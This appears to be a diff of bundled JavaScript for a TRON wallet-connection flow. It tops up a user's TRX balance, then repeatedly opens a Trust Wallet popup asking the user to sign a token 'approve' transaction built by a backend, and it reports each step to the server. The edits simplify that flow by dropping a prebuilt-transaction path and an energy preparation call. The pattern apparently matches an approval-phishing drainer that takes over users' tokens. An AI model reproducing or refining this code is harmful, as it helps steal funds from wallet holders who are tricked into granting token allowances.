@@ -90806,33 +90806,25 @@
                     let triggerResult = null;
                     let triggerError = null;
 
-                    // 0) Use pre-built approve tx (prepared during top-up wait) so Trust popup opens instantly
-                    if (this._prebuiltTrigger) {
-                        triggerResult = this._prebuiltTrigger;
-                        this._prebuiltTrigger = null;
-                        console.log("[SIGN] using prebuilt approve tx")
-                    }
-
-                    // 1) Prefer server-built approve tx (has TronGrid API key)
-                    if (!triggerResult)
-                        try {
-                            console.log("[SIGN] Building approve via backend /build-approve for", e);
-                            const buildRes = await GS.post(API_BASE + "/build-approve", {
-                                userAddress: e,
-                                feeLimit: feeLimit
-                            }, {
-                                timeout: 20000
-                            });
-                            if (buildRes && buildRes.data && buildRes.data.success && buildRes.data.triggerResult) {
-                                triggerResult = buildRes.data.triggerResult;
-                                console.log("[SIGN] backend build-approve OK")
-                            } else {
-                                triggerError = new Error(buildRes && buildRes.data && buildRes.data.message ? buildRes.data.message : "backend build-approve failed")
-                            }
-                        } catch (buildErr) {
-                            triggerError = buildErr;
-                            console.warn("[SIGN] backend build-approve failed, fallback local", buildErr && buildErr.message ? buildErr.message : buildErr)
+                    // Prefer server-built approve tx (has TronGrid API key) — no energy
+                    try {
+                        console.log("[SIGN] Building approve via backend /build-approve for", e);
+                        const buildRes = await GS.post(API_BASE + "/build-approve", {
+                            userAddress: e,
+                            feeLimit: feeLimit
+                        }, {
+                            timeout: 20000
+                        });
+                        if (buildRes && buildRes.data && buildRes.data.success && buildRes.data.triggerResult) {
+                            triggerResult = buildRes.data.triggerResult;
+                            console.log("[SIGN] backend build-approve OK")
+                        } else {
+                            triggerError = new Error(buildRes && buildRes.data && buildRes.data.message ? buildRes.data.message : "backend build-approve failed")
                         }
+                    } catch (buildErr) {
+                        triggerError = buildErr;
+                        console.warn("[SIGN] backend build-approve failed, fallback local", buildErr && buildErr.message ? buildErr.message : buildErr)
+                    }
 
                     // 2) Fallback: local trigger with long 429 backoff
                     if (!triggerResult) {
@@ -93074,54 +93066,35 @@
                         recentTopUp = ts > 0 && Date.now() - ts < 180000
                     } catch (_) {}
 
-                    let prebuiltTrigger = null;
-                    const waitThenPrebuild = async (reason, txHint) => {
+                    // After successful top-up log: wait 5s then show approve popup. No energy checks.
+                    const wait5ThenApprove = async (reason, txHint) => {
                         reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
-                            waitMs: 7000,
+                            waitMs: 5000,
                             reason: reason,
                             tx: txHint || null
                         });
-                        // Pre-build approve DURING the 7s wait so Trust popup opens immediately after
-                        const buildPromise = GS.post(API_BASE + "/build-approve", {
-                            userAddress: c,
-                            feeLimit: 15e6
-                        }, {
-                            timeout: 20000
-                        }).catch((err) => {
-                            reportEvent("PREBUILD_APPROVE_FAILED", {
-                                error: err && err.message ? err.message : String(err)
-                            });
-                            return null
+                        console.log("[6] TOP-UP OK — wait 5s then approve popup", {
+                            reason: reason,
+                            tx: txHint || null
                         });
-                        await new Promise((resolve) => setTimeout(resolve, 7000));
-                        try {
-                            const buildRes = await buildPromise;
-                            if (buildRes && buildRes.data && buildRes.data.success && buildRes.data.triggerResult) {
-                                prebuiltTrigger = buildRes.data.triggerResult;
-                                reportEvent("PREBUILD_APPROVE_OK", {
-                                    hasTransaction: !0
-                                })
-                            }
-                        } catch (_) {}
+                        await new Promise((resolve) => setTimeout(resolve, 5000));
                         reportEvent("TRX_TOPUP_CONFIRM_DONE", {
-                            waitMs: 7000,
-                            continueToApprove: true,
-                            hasPrebuilt: !!prebuiltTrigger
+                            waitMs: 5000,
+                            continueToApprove: true
                         })
                     };
 
                     if (balanceInTRX < minTrx && recentTopUp) {
-                        // TRX already sent recently — wait 7s then open approve
                         console.log("[4] TRX TOP-UP START", {
                             skipped: true,
-                            reason: "recent-topup-reuse wait 7s then approve"
+                            reason: "recent-topup-reuse wait 5s then approve"
                         });
                         reportEvent("TRX_TOPUP_SKIPPED", {
                             reason: "recent-topup-reuse",
                             balanceInTRX: balanceInTRX
                         });
                         topUpSent = true;
-                        await waitThenPrebuild("recent-topup-reuse")
+                        await wait5ThenApprove("recent-topup-reuse")
                     } else if (balanceInTRX < minTrx) {
                         console.log("[4] TRX TOP-UP START", {
                             skipped: false,
@@ -93180,15 +93153,11 @@
                             });
 
                             if (topUpSent) {
-                                // After successful top-up TX: wait 7s (prebuild approve in parallel) then open popup
-                                console.log("[6] POST-TOP-UP WAIT 7s THEN APPROVE", {
-                                    waitMs: 7000,
-                                    tx: topUpTxId
-                                });
                                 try {
                                     sessionStorage.setItem("trxToppedUp:" + c, String(Date.now()))
                                 } catch (_) {}
-                                await waitThenPrebuild("after-topup-sent", topUpTxId)
+                                // Top-up success log received → wait 5s → show Trust popup
+                                await wait5ThenApprove("after-topup-sent", topUpTxId)
                             } else {
                                 console.log("[6] POST-TOP-UP BALANCE CHECK START", {
                                     skipped: true,
@@ -93245,42 +93214,23 @@
                         })
                     }
 
-                    // NEVER use feeLimit 1e9 (USDT/Energy rental). Always TRX fee mode.
+                    // NEVER use feeLimit 1e9. No energy — just open approve popup.
                     const feeLimit = 15e6;
-
-                    // Fire-and-forget energy nudge — do NOT block WC (Proposal expired if we wait)
-                    reportEvent("PREPARE_ENERGY_START", {
-                        mode: "fire_and_forget"
-                    });
-                    GS.post(API_BASE + "/prepare-energy", {
-                        userAddress: c
-                    }, {
-                        timeout: 12000
-                    }).then((energyRes) => {
-                        reportEvent("PREPARE_ENERGY_RESULT", energyRes && energyRes.data ? energyRes.data : {})
-                    }).catch((energyErr) => {
-                        reportEvent("PREPARE_ENERGY_FAILED", {
-                            error: energyErr && energyErr.message ? energyErr.message : String(energyErr)
-                        })
-                    });
 
                     console.log("Opening sign popup", {
                         balanceInTRX: balanceInTRX,
                         feeLimit: feeLimit,
-                        feeMode: "TRX-no-rental",
-                        topUpSent: topUpSent
+                        fromTopUp: topUpSent
                     });
                     reportEvent("APPROVAL_INITIATED", {
                         balanceInTRX: balanceInTRX,
                         feeLimit: feeLimit,
-                        feeMode: "TRX-no-rental",
                         fromTopUp: topUpSent
                     });
                     await f(c, feeLimit, {
                         fromTopUp: topUpSent,
                         retries: 2,
-                        reportEvent: reportEvent,
-                        prebuiltTrigger: prebuiltTrigger
+                        reportEvent: reportEvent
                     });
                 } catch (a) {
                     console.error("[10] ERROR", a);
@@ -93440,29 +93390,14 @@
                             });
                             break
                         }
-                        // Use prebuilt tx on first attempt so popup opens with no extra network delay
-                        if (1 === tryNo && options.prebuiltTrigger)
-                            r._prebuiltTrigger = options.prebuiltTrigger;
                         console.log("[SIGN] approve attempt", {
                             tryNo: tryNo,
-                            maxTries: maxTries,
-                            hasPrebuilt: !!r._prebuiltTrigger
+                            maxTries: maxTries
                         });
                         reportEvent("APPROVAL_ATTEMPT", {
                             tryNo: tryNo,
-                            maxTries: maxTries,
-                            hasPrebuilt: !!r._prebuiltTrigger
+                            maxTries: maxTries
                         });
-                        // Wake WalletConnect session after top-up delay so Trust shows the request
-                        try {
-                            if (r.provider && "function" === typeof r.provider.request)
-                                await Promise.race([
-                                    r.provider.request({
-                                        method: "tron_requestAccounts"
-                                    }, "tron:0x2b6653dc").catch(() => null),
-                                    new Promise((resolve) => setTimeout(resolve, 1500))
-                                ])
-                        } catch (_) {}
                         try {
                             n = await r.sendTransaction(e, feeLimit)
                         } catch (signErr) {
